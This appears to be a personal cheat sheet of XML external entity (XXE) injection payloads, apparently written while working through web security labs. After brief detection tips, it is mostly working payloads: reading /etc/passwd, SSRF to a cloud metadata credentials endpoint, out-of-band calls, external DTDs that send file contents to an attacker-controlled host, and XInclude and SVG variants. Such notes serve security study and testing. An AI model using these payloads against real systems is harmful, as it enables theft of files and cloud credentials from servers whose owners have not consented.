# XML external entity (XXE) injection
## Introduction 
vulnerability that allows an attacker to interfere with an application's processing of XML data
## How to find ? 
- Identify all visible instances in the application where client supplied input is parsed as XML code.  
- Inject XML meta-characters, such as a single quote, double quote, angle brackets, etc., to see if an error is thrown in the application that indicates if the application is using an XML parser. 
- Automate testing using a web application vulnerability scanner
## How to exploit ? 
1. simple external XXE injection, add the DTD in every node
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM
"file:///etc/passwd">]>
<stockCheck>
	<productId>
		&xxe;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```
2. Combine with SSRF, look for internal resources 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
	<productId>
		&xxe;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```
3. OAST using XXE 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://a9kmf5iz21mq3vltyvipl7ijaag14rsg.oastify.com"> ]>
<stockCheck>
	<productId>
		&xxe;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```
4. OAST using parameter entities 
```xml 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://5bhhh0ku4wol5qno0qkkn2kec5iw6oud.oastify.com"> %xxe; ]>
<stockCheck>
	<productId>
		&xxe;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```
5. Exfiltrate data OAST
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-0add000e03a4de4182ba886c019400a4.exploit-server.net/exploit"> %xxe; ]>
<stockCheck>
	<productId>
		&xxe;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```
- NOTE: the exploit file that i am hosting must have the following content 
```xml 
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
6. If there was verbose error messages 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-0add000e03a4de4182ba886c019400a4.exploit-server.net/exploit"> %xxe; ]>
<stockCheck>
	<productId>
		&xxe;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```
- Note: the external DTD at exploit server must have the following content 
```xml 
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfiltrate;
```
7. Use XInclude 
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```
8. XXE within svg files 
```xml
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```